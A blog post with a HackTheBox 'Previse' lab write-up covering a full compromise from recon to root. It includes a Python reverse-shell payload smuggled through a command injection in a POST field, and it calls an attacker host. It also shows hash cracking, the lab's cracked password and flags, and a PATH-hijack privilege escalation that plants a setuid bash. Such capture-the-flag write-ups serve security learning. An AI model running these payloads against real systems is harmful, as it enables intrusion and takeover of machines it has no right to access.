<!DOCTYPE html>
<html lang="en">
<head>
<title>Previse - HackTheBox machine :: RoundofThree</title>
<meta content="text/html; charset=utf-8" http-equiv="content-type"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<meta content="Foothold 1- Nmap discovers tcp 22 and 80 ports.
# Nmap 7.91 scan initiated Thu Aug 12 05:08:52 2021 as: nmap -sV -sC -oA nmap -p- -v previse.htb Nmap scan report for previse.htb (10.10.11.104) Host is up (0.068s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA) | 256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA) |_ 256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519) 80/tcp open http Apache httpd 2." name="description"/>
<meta content="[hacking kaggle blog resume hackthebox machine-learning reverse-engineering infosec]" name="keywords"/>
<meta content="noodp" name="robots"/>
<link href="/labs/previse/" rel="canonical"/>
<link href="/assets/style.css" rel="stylesheet"/>
<link href="/img/apple-touch-icon-192x192.png" rel="apple-touch-icon"/>
<link href="/favicon.png" rel="shortcut icon"/>
<meta content="summary" name="twitter:card"/>
<meta content="" name="twitter:site"/>
<meta content="RoundofThree" name="twitter:creator"/>
<meta content="en" property="og:locale"/>
<meta content="article" property="og:type"/>
<meta content="Previse - HackTheBox machine" property="og:title"/>
<meta content="Foothold 1- Nmap discovers tcp 22 and 80 ports.
# Nmap 7.91 scan initiated Thu Aug 12 05:08:52 2021 as: nmap -sV -sC -oA nmap -p- -v previse.htb Nmap scan report for previse.htb (10.10.11.104) Host is up (0.068s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA) | 256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA) |_ 256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519) 80/tcp open http Apache httpd 2." property="og:description"/>
<meta content="/labs/previse/" property="og:url"/>
<meta content="RoundofThree" property="og:site_name"/>
<meta content="/favicon.png" property="og:image"/>
<meta content="2048" property="og:image:width"/>
<meta content="1024" property="og:image:height"/>
<meta content="2021-09-05 13:56:52 +0200 +0200" property="article:published_time"/>
</head>
<body class="orange">
<div class="container center headings--one-size">
<header class="header">
<div class="header__inner">
<div class="header__logo">
<a href="/">
<div class="logo">
    RoundofThree
  </div>
</a>
</div>
<div class="menu-trigger">menu</div>
</div>
<nav class="menu">
<ul class="menu__inner menu__inner--desktop">
<li><a href="/general">General</a></li>
<li><a href="/labs">Labs</a></li>
<li><a href="/research">Research</a></li>
<li><a href="/">Whoami</a></li>
</ul>
<ul class="menu__inner menu__inner--mobile">
<li><a href="/general">General</a></li>
<li><a href="/labs">Labs</a></li>
<li><a href="/research">Research</a></li>
<li><a href="/">Whoami</a></li>
</ul>
</nav>
</header>
<form action="/search/" id="search" method="get">
<label for="search-input" hidden="">Search site</label>
<input id="search-input" name="query" placeholder="Type here to search" type="text"/>
<input type="submit" value="search"/>
</form>
<div class="content">
<div class="post">
<h1 class="post-title">
<a href="/labs/previse/">Previse - HackTheBox machine</a></h1>
<div class="post-meta">
<span class="post-date">
        2021-09-05 
      </span>
<span class="post-author">:: RoundofThree</span>
</div>
<span class="post-tags">
    
    #<a href="/tags/hackthebox/">HackTheBox</a> 
    
  </span>
<div class="post-content"><div>
<h2 id="foothold">Foothold<a arialabel="Anchor" class="hanchor" href="#foothold">⌗</a> </h2>
<p>1- Nmap discovers tcp 22 and 80 ports.</p>
<pre tabindex="0"><code># Nmap 7.91 scan initiated Thu Aug 12 05:08:52 2021 as: nmap -sV -sC -oA nmap -p- -v previse.htb
Nmap scan report for previse.htb (10.10.11.104)
Host is up (0.068s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-favicon: Unknown favicon MD5: B21DD667DF8D81CAE6DD1374DD548004
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Previse Login
|_Requested resource was login.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Aug 12 05:17:04 2021 -- 1 IP address (1 host up) scanned in 491.95 seconds
</code></pre><p>2- <a href="http://previse.htb/login.php">http://previse.htb/login.php</a> is a login page. Intercept POST packet with filled parameters to <code>login.php</code> and save it to <code>request.txt</code>.</p>
<p>Try with SQLi:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4" tabindex="0"><code class="language-bash" data-lang="bash">sqlmap -r request.txt -p password 
<span style="color:#75715e"># (try with username param too)</span>
</code></pre></div><p>No SQLi flaws discovered by sqlmap.</p>
<p>3- Fuzz the request path.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4" tabindex="0"><code class="language-bash" data-lang="bash">wfuzz -w /opt/SecLists/Discovery/Web-Content/raft-large-files.txt --hc<span style="color:#f92672">=</span><span style="color:#ae81ff">404</span> http://previse.htb
</code></pre></div><p>Interesting files:</p>
<pre tabindex="0"><code>index.php -- 302 Found --&gt; RESPONSE1 (see step 4 for details)
login.php
config.php
download.php -- 302 --&gt; login.php
header.php
footer.php
status.php -- 302 --&gt; MySQL server is running!
nav.php
accounts.php -- 302 --&gt; Create an admin account
files.php -- 302  --&gt; backup.zip YEAH!!! Site backups are very welcome!
</code></pre><p>4- Intercept request packet with BurpSuite and intercept the response. See annotations above.</p>
<p>RESPONSE1: portal page with links to Home (index.php), create account (accounts.php), files.php, management menu (status.php) and log data (file_log.php).</p>
<p>5- The only interesting things are backup.zip and the page to create an account. Unzip backup.zip. Look at the config.php.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4" tabindex="0"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>

<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">connectDB</span>(){
    $host <span style="color:#f92672">=</span> <span style="color:#e6db74">'localhost'</span>;
    $user <span style="color:#f92672">=</span> <span style="color:#e6db74">'root'</span>;
    $passwd <span style="color:#f92672">=</span> <span style="color:#e6db74">'mySQL_p@ssw0rd!:)'</span>;
    $db <span style="color:#f92672">=</span> <span style="color:#e6db74">'previse'</span>;
    $mycon <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">mysqli</span>($host, $user, $passwd, $db);
    <span style="color:#66d9ef">return</span> $mycon;
}

<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><p>MySQL credentials:</p>
<pre tabindex="0"><code>root
mySQL_p@ssw0rd!:)
DBname: previse
</code></pre><p>But we can only access the database from localhost… Try reusing the credentials with ssh. Impossible though that the SSH root user is the SQL user, so we still need a username. Besides, the password does look like it’s specific to MySQL service.</p>
<p>6- Revise all files in the site backup folder. Look at logs.php. <code>exec()</code> promises a command injection opportunity.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4" tabindex="0"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$_SERVER[<span style="color:#e6db74">'REQUEST_METHOD'</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">'POST'</span>) {
    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">'Location: login.php'</span>);
    <span style="color:#66d9ef">exit</span>;
}

<span style="color:#75715e">/////////////////////////////////////////////////////////////////////////////////////
</span><span style="color:#75715e">//I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER//
</span><span style="color:#75715e">/////////////////////////////////////////////////////////////////////////////////////
</span><span style="color:#75715e"></span>
$output <span style="color:#f92672">=</span> <span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">"/usr/bin/python /opt/scripts/log_process.py </span><span style="color:#e6db74">{</span>$_POST[<span style="color:#e6db74">'delim'</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">"</span>);
<span style="color:#66d9ef">echo</span> $output;

$filepath <span style="color:#f92672">=</span> <span style="color:#e6db74">"/var/www/out.log"</span>;
$filename <span style="color:#f92672">=</span> <span style="color:#e6db74">"out.log"</span>;    

<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">file_exists</span>($filepath)) {
    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">'Content-Description: File Transfer'</span>);
    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">'Content-Type: application/octet-stream'</span>);
    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">'Content-Disposition: attachment; filename="'</span><span style="color:#f92672">.</span><span style="color:#a6e22e">basename</span>($filepath)<span style="color:#f92672">.</span><span style="color:#e6db74">'"'</span>);
    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">'Expires: 0'</span>);
    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">'Cache-Control: must-revalidate'</span>);
    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">'Pragma: public'</span>);
    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">'Content-Length: '</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">filesize</span>($filepath));
    <span style="color:#a6e22e">ob_clean</span>(); <span style="color:#75715e">// Discard data in the output buffer
</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">flush</span>(); <span style="color:#75715e">// Flush system headers
</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">readfile</span>($filepath);
    <span style="color:#66d9ef">die</span>();
} <span style="color:#66d9ef">else</span> {
    <span style="color:#a6e22e">http_response_code</span>(<span style="color:#ae81ff">404</span>);
    <span style="color:#66d9ef">die</span>();
} 
<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><p>The interesting part is here:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4" tabindex="0"><code class="language-php" data-lang="php">$output <span style="color:#f92672">=</span> <span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">"/usr/bin/python /opt/scripts/log_process.py </span><span style="color:#e6db74">{</span>$_POST[<span style="color:#e6db74">'delim'</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">"</span>);
<span style="color:#66d9ef">echo</span> $output;
</code></pre></div><p>We can trigger a reverse shell.</p>
<p>Target command:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4" tabindex="0"><code class="language-bash" data-lang="bash">python log_process.py comma;python3 -c <span style="color:#e6db74">'import pty,os,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",ATTACKER_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'</span> 
</code></pre></div><p>Change the POST param in Burpsuite:</p>
<pre tabindex="0"><code>POST /logs.php HTTP/1.1
Host: previse.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 11
Origin: http://previse.htb
DNT: 1
Connection: close
Referer: http://previse.htb/file_logs.php
Cookie: PHPSESSID=irv4p251afkcliqfqp41f03jbe
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

delim=comma;python3+-c+'import+os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
</code></pre><p>7- To escalate from a <code>www-data</code> account, I am used to look for config files and database. Use the previously obtained MySQL credentials to access the database using the reverse shell:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4" tabindex="0"><code class="language-bash" data-lang="bash">mysql -u root -p
Enter password: mySQL_p@ssw0rd!:<span style="color:#f92672">)</span>

&gt; use previse;
&gt; show tables;  <span style="color:#75715e"># accounts and files</span>
&gt; <span style="color:#66d9ef">select</span> * from accounts;
<span style="color:#75715e"># columns id, username, password and created_at</span>
</code></pre></div><p>So, the username is <code>m4lwhere</code> and we have a password hash in md5crypt. Save the hash to hash.txt and crack it with Hashcat.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4" tabindex="0"><code class="language-bash" data-lang="bash">hashcat -a <span style="color:#ae81ff">0</span> -m <span style="color:#ae81ff">500</span> hash.txt --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt
</code></pre></div><p>Same but with –show:</p>
<pre tabindex="0"><code>username = m4lwhere
hash = $1$🧂llol$DQpmdvnb7EeuO6UaqRItf.
password = ilovecody112235!
</code></pre><p>Note that john doesn’t support non-printable characters in hash.</p>
<p>8- SSH and get user.txt: c6a4ac1ae3f1152e13cdfd5f6005673f</p>
<h2 id="privilege-escalation">Privilege escalation<a arialabel="Anchor" class="hanchor" href="#privilege-escalation">⌗</a> </h2>
<p>9- <code>sudo -l</code> reveals the script <code>/opt/scripts/access_backup.sh</code>.</p>
<p>10- Copy to local machine:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4" tabindex="0"><code class="language-bash" data-lang="bash">scp m4lwhere@previse.htb:/opt/scripts/access_backup.sh .
</code></pre></div><p>By looking at this file, we find command path vulnerability.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4" tabindex="0"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
</span><span style="color:#75715e"></span>
<span style="color:#75715e"># We always make sure to store logs, we take security SERIOUSLY here</span>

<span style="color:#75715e"># I know I shouldnt run this as root but I cant figure it out programmatically on my account</span>
<span style="color:#75715e"># This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time</span>

gzip -c /var/log/apache2/access.log &gt; /var/backups/<span style="color:#66d9ef">$(</span>date --date<span style="color:#f92672">=</span><span style="color:#e6db74">"yesterday"</span> +%Y%b%d<span style="color:#66d9ef">)</span>_access.gz
gzip -c /var/www/file_access.log &gt; /var/backups/<span style="color:#66d9ef">$(</span>date --date<span style="color:#f92672">=</span><span style="color:#e6db74">"yesterday"</span> +%Y%b%d<span style="color:#66d9ef">)</span>_file_access.gz
</code></pre></div><p>11- We can put a script named <code>gzip</code> in the current workdir and execute <code>access_backup.sh</code> as root.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4" tabindex="0"><code class="language-bash" data-lang="bash">cd /tmp
<span style="color:#75715e"># set gzip to be bash with setuid bit</span>
cat <span style="color:#e6db74">&lt;&lt; EOF &gt; gzip 
</span><span style="color:#e6db74">#!/bin/bash
</span><span style="color:#e6db74">cp /bin/bash /tmp/c
</span><span style="color:#e6db74">chmod u+s /tmp/c
</span><span style="color:#e6db74">EOF</span>
</code></pre></div><p>12- Now <code>/tmp/c</code> is a setuid bash.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4" tabindex="0"><code class="language-bash" data-lang="bash">/tmp/c -p <span style="color:#75715e"># this flag sets the real userid as the effective userid</span>
</code></pre></div><p>root.txt: 23c44ab8465e7ff51a5fab75847e088b</p>
</div></div>
</div>
</div>
<footer class="footer">
<div class="footer__inner">
<div class="copyright copyright--user">
<span>© 2021 RoundofThree</span>
</div>
</div>
</footer>
<script src="/assets/main.js"></script>
<script src="/assets/prism.js"></script>
</div>
</body>
</html>
